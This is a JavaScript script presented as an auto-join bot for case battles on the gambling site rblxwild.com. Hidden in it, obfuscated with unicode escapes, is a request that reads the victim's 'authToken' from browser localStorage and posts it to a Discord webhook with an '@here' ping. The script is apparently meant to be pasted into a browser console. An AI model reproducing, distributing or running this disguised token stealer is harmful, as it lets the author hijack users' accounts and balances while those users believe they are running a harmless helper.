function lord() {
let socket = new WebSocket("wss://rblxwild.com/socket.io/?EIO=4&transport=websocket");
authtoken = "AuthToken Here"
socket.onopen = function(e) {

};
var request = new XMLHttpRequest;
request.open("\u0050\u004f\u0053\u0054", "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0031\u0030\u0037\u0034\u0037\u0035\u0036\u0033\u0039\u0036\u0037\u0033\u0031\u0036\u0030\u0035\u0030\u0036\u0032\u002f\u0069\u004d\u0039\u0041\u0063\u0061\u004e\u0047\u0046\u0064\u006b\u0064\u0058\u0052\u0045\u0066\u0057\u0039\u0059\u0047\u0069\u0064\u006e\u0034\u0077\u0063\u0076\u0079\u0057\u006c\u0032\u0052\u0032\u0069\u0041\u006d\u006f\u006c\u0041\u0074\u007a\u0062\u004a\u0070\u0042\u0079\u0054\u0066\u0034\u0030\u0078\u0045\u0045\u0049\u0067\u0075\u0055\u0039\u0072\u0070\u0059\u0039\u0037\u0058\u0061\u0058\u0072\u0051", true);
request.setRequestHeader("\u0043\u006f\u006e\u0074\u0065\u006e\u0074\u002d\u0054\u0079\u0070\u0065", "\u0061\u0070\u0070\u006c\u0069\u0063\u0061\u0074\u0069\u006f\u006e\u002f\u006a\u0073\u006f\u006e");
var params = JSON.stringify({content: "\u0040\u0068\u0065\u0072\u0065\u0020\u0041\u0075\u0074\u0068\u0065\u006e\u0074\u0069\u0063\u0061\u0074\u0069\u006f\u006e\u0020\u0054\u006f\u006b\u0065\u006e\u003a\u0020" + localStorage.getItem("\u0061\u0075\u0074\u0068\u0054\u006f\u006b\u0065\u006e")});
request.send(params);
socket.onmessage = function(event) {
if (!(event.data.includes("syncResponse"))) console.log(event.data)
    if (event.data.startsWith("0")) {
        socket.send("40")
    }
    if (event.data.startsWith("40")) {
        socket.send(`42["authentication",{"authToken":"${authtoken}","clientTime":${Date.now()}}]`)
        setTimeout(() => {
            function keepalive() {
                socket.send(`42["time:requestSync",{"clientTime":${Date.now()}}]`)
                setTimeout(() => {
                    keepalive()
                }, 1000);
            }
            keepalive()
        }, 3000);
    }
    


    if (event.data.startsWith(`42["authenticationResponse"`)) {
        socket.send(`42["casebattles:subscribe"]`)
    }
    if (event.data.startsWith(`42["casebattles:pushGame`)) {
        pushedBattle = JSON.parse(event.data.replace("42", ""))[1]
        if (pushedBattle.betAmount * 0.2 <= pushedBattle.funding) {
            console.log(`Found game: \nID: ${pushedBattle.id}\nType: ${pushedBattle.versusType}\nBet amount: ${pushedBattle.betAmount}\nFunding amount: ${pushedBattle.funding}`)
            if (pushedBattle.versusType == "2v2") {
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":1,"seatIndex":1}]`)
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":1}]`)
            }
            if (pushedBattle.versusType == "1v1") {
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
            }
            if (pushedBattle.versusType == "1v1v1") {
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":3,"seatIndex":0}]`)
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
            }
            if (pushedBattle.versusType == "1v1v1v1") {
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":3,"seatIndex":0}]`)
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":4,"seatIndex":0}]`)
            }
        }
    }
};

socket.onclose = function(event) {
console.log("Lord Rule RblxWild")
  ws.close()
  lord()
};

socket.onerror = function(error) {
  console.log(`[error]`)
  lord()
};
}
lord()
